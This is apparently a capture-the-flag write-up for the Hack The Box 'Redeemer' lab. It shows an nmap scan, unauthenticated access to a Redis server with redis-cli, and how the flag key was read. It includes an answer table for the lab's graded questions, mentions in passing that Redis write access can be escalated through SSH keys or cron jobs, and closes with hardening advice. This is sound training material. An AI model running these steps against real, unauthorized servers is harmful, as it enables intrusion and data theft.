# HTB Starting Point — "Redeemer" (Linux)

**Category:** Starting Point (Tier 0)  
**Difficulty:** Very Easy  
**OS:** Linux  
**XP reward:** 150

---

## Challenge Description

Redeemer is the fifth machine of the Hack The Box Starting Point track. It introduces **Redis**, an in-memory key-value database, and shows what happens when a Redis server is exposed on the network **without authentication**.

The machine is spawned as a target reachable through the VPN:

```text
<TARGET_IP>
```

> The IP changes every time the machine is respawned.

---

## Tooling

- `openvpn` — to connect to the HTB lab network
- `ping` — to test connectivity with the target
- `nmap` — to discover open ports and identify services (full port scan needed here)
- `redis-cli` — command-line client to interact with a Redis server

---

## Guided Questions (Tasks 1–10)

| Task | Question | Answer |
|------|----------|--------|
| 1 | Which TCP port is open on the machine? | `6379` |
| 2 | Which service is running on that port? | `redis` |
| 3 | What type of database is Redis? | `In-memory Database` |
| 4 | Command-line utility used to interact with the Redis server? | `redis-cli` |
| 5 | Flag used with the Redis utility to specify the hostname? | `-h` |
| 6 | Command to get information and statistics about the server? | `info` |
| 7 | Version of the Redis server on the target? | `5.0.7` |
| 8 | Command used to select the desired database? | `select` |
| 9 | How many keys are present in the database with index 0? | `4` |
| 10 | Command used to obtain all the keys in a database? | `keys *` |

---

## Recon: Connecting to the Lab

Connect to the HTB network with the VPN configuration file downloaded from the platform (here, the *EU StartingPoint 2* server):

```bash
sudo openvpn starting_point_<username>.ovpn
```

Then check that the target is reachable:

```bash
ping -c 4 <TARGET_IP>
```

```text
64 bytes from <TARGET_IP>: icmp_seq=1 ttl=63 time=...
```

Replies come back, so the target is alive.

---

## Port Scanning

A default `nmap` scan only covers the 1000 most common ports, and Redis' port is not among them. Scan **all 65535 ports** with `-p-`, combined with version detection (`-sV`):

```bash
nmap -p- -sV <TARGET_IP>
```

```text
PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 5.0.7
```

Key findings:

- Only one port is open: **6379/tcp**, running **Redis**.
- The version is **5.0.7**.

Redis is an **in-memory** database: data is stored in RAM, which makes it very fast. It is mostly used as a cache, a message broker or a session store, and it uses a key-value model instead of tables like a traditional database.

---

## Gaining Access

Connect to the server with `redis-cli`, using `-h` to specify the target host:

```bash
redis-cli -h <TARGET_IP>
```

```text
<TARGET_IP>:6379>
```

We get a prompt directly: no username or password is required, which means the server has **no authentication** configured.

Get the server information and statistics with the `info` command:

```text
<TARGET_IP>:6379> info
# Server
redis_version:5.0.7
...
# Keyspace
db0:keys=4,expires=0,avg_ttl=0
```

The `# Keyspace` section confirms the version (**5.0.7**) and shows that database **0** contains **4 keys**.

---

## Getting the Flag

Select database 0 with `select`:

```text
<TARGET_IP>:6379> select 0
OK
```

List all the keys of the database with `keys *`:

```text
<TARGET_IP>:6379> keys *
1) "numb"
2) "temp"
3) "flag"
4) "stor"
```

Four keys are present, and one of them is named `flag`. Read its value with `get`:

```text
<TARGET_IP>:6379> get flag
"HTB{REDACTED}"
```

Submit it in the **Submit Flag** field on the platform to own the machine.

---

## Takeaways

- **An unauthenticated Redis instance exposed on the network is a critical misconfiguration.** Anyone who can reach the port can read, modify or delete all the data.
- **Default scans can miss services.** A basic `nmap` scan would not have found port 6379; scanning all ports with `-p-` was necessary.
- **Always enumerate the data store.** `info` gave the version and the number of keys per database, and `keys *` revealed every key, including the flag.
- **Redis can be abused beyond data theft.** On older or badly configured instances, write access can be leveraged to gain code execution (for example by writing SSH keys or cron jobs), so exposure should always be treated as serious.
- **Hardening checklist:** set a strong password (`requirepass`) or use ACLs, bind Redis to `127.0.0.1` or a private interface, enable protected mode, restrict port 6379 with a firewall, and keep Redis up to date.
